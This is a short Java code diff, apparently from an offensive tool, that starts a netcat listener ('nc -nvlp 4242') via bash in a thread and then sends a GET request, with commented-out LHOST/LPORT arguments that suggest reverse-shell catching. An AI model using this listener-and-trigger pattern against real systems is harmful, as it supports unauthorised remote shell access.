@@ -14,15 +14,35 @@ import threads.CommandThread;
 public class App {
 
 	public static void main(String[] args) {
-		
-		CommandThread escuchar = new CommandThread("nc -nvlp 4242"); 
+				
+		Thread escuchar = new Thread() {
+			public void run() {
+				ProcessBuilder processBuilder = new ProcessBuilder();
+				processBuilder.command("bash", "-c", "nc -nvlp 4242");					
+					try {
+						Process process = processBuilder.start();			
+						
+						process.getInputStream();
+						
+						process.waitFor();
+
+					} catch (IOException e) {
+						e.printStackTrace();
+					} catch (InterruptedException e) {
+						// TODO Auto-generated catch block
+						e.printStackTrace();
+					} 			
+			}
+		};
 		escuchar.start();
+		System.out.println("LLEGO ACA");
 		try {
 			sendGET();
 		} catch (IOException e) {
 			// TODO Auto-generated catch block
 			e.printStackTrace();
 		}
+	
 		//String LHOST = args[0];
 		//String LPORT = args[1];
 		
